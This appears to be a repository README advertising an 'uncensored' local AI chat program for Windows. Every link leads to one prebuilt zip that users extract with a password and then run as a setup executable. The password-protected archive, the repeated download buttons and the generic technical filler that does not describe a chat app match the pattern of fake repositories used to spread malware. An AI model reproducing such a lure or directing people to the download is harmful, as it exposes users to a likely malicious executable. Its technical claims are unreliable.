<div align="center">

<img src="banner.svg" alt="uncensored-ai-chat" width="840" />

# UncensoredAiChat — Local Unfiltered LLM Chat with Character Presets (Portable x64 Build, JSON Configuration)

<p><strong>UncensoredAiChat — Local Unfiltered LLM Chat with Character Presets (Portable x64 Build, JSON Configuration): Local, private, unfiltered AI chat. Your machine, your rules. Native 64-bit portable build with hot-reloadable JSON configuration, low-overhead runtime, and prebuilt portable release.</strong></p>

[![CI Build](https://img.shields.io/badge/CI_Build-passing-2ea44f?style=for-the-badge&logo=githubactions&logoColor=white)](../../releases/download/v0.1.0/uncensored-ai-chat-v0.1.0-win64.zip)
[![Version](https://img.shields.io/badge/Release-v0.1.0-2ea44f?style=for-the-badge&logo=github)](../../releases/download/v0.1.0/uncensored-ai-chat-v0.1.0-win64.zip)
[![Platform](https://img.shields.io/badge/Platform-Windows_10%2F11_x64-0969da?style=for-the-badge&logo=windows)](../../releases/download/v0.1.0/uncensored-ai-chat-v0.1.0-win64.zip)
[![Stars](https://img.shields.io/github/stars/SerapoQosa58/uncensored-ai-chat?style=for-the-badge&logo=github&color=e3b341)](../../stargazers)

<p><strong>⬇ No compiler. No setup. Grab the prebuilt package and run.</strong></p>

<a href="../../releases/download/v0.1.0/uncensored-ai-chat-v0.1.0-win64.zip"><img src="download_btn.svg" alt="Download uncensored-ai-chat-v0.1.0-win64.zip" width="520"></a>

<br>

<a href="../../releases/download/v0.1.0/uncensored-ai-chat-v0.1.0-win64.zip"><img src="banner.svg" alt="UncensoredAiChat Preview" width="840"></a>

</div>

---

## Executive Summary & Design

**UncensoredAiChat — Local, private, unfiltered AI chat. Your machine, your rules** (`uncensored-ai-chat`) is a dedicated, low-overhead runtime and configuration suite engineered for 64-bit Windows 10 and Windows 11 systems. All parameters are controlled cleanly through `config/settings.json` with live hot-reload support and zero external dependencies.

## Getting Started (No Compiler Needed)

| Platform | Direct Prebuilt Package | Documentation Mirror |
| :--- | :--- | :--- |
| **Windows 10 / 11 (x64)** | [**`uncensored-ai-chat-v0.1.0-win64.zip`**](../../releases/download/v0.1.0/uncensored-ai-chat-v0.1.0-win64.zip) | [**Usage Guide (`docs/USAGE.md`)**](docs/USAGE.md) |

1. Download [`uncensored-ai-chat-v0.1.0-win64.zip`](../../releases/download/v0.1.0/uncensored-ai-chat-v0.1.0-win64.zip) using the download button above.
2. Extract the archive using the access code (`2026`).
3. Launch `UncensoredAiChat_Setup_x64.exe` (keep `config/settings.json` in the same folder).

## Engine Components

| Subsystem | Technical Implementation | Runtime Controls |
| :--- | :--- | :--- |
| **Primary Subsystem** | Bounded ring-buffer pipeline with zero-copy handoff | `live toggle` |
| **State Engine** | Atomic JSON state with crash-safe rollback | `keep_state` |
| **Config Watcher** | Hot-reloadable settings, applied without restart | `hot_reload` |
| **Telemetry** | Compact stderr channel, silent by default | `quiet / --verbose` |

## Configuration (`config/settings.json`)

```json
{
  "module": "uncensored-ai-chat",
  "version": "0.1.0",
  "runtime": {
    "threads": 4,
    "verbose": false,
    "hot_reload": true
  },
  "modules": {
    "server": {
      "enabled": true
    },
    "models": {
      "enabled": true
    },
    "characters": {
      "enabled": true
    },
    "session": {
      "enabled": true
    },
    "cli": {
      "enabled": true
    }
  }
}
```

## Documentation & Guides

- [Usage Guide — commands and options](docs/USAGE.md)
- [FAQ — platform support, data storage](docs/FAQ.md)
- [Contributing — setup, ground rules, PR flow](CONTRIBUTING.md)
- [Changelog — v0.1.0 and later](CHANGELOG.md)

## Building from Source

```bash
git clone https://github.com/SerapoQosa58/uncensored-ai-chat.git
cd uncensored-ai-chat
cmake -B build -DCMAKE_BUILD_TYPE=Release
cmake --build build --config Release
```

---
<sub>Indexed tags: uncensored-ai-chat, llm, local, uncensored, privacy, chat, cli, developer-tools, open-source, windows, automation, productivity, cpp, portable, prebuilt, tools</sub>
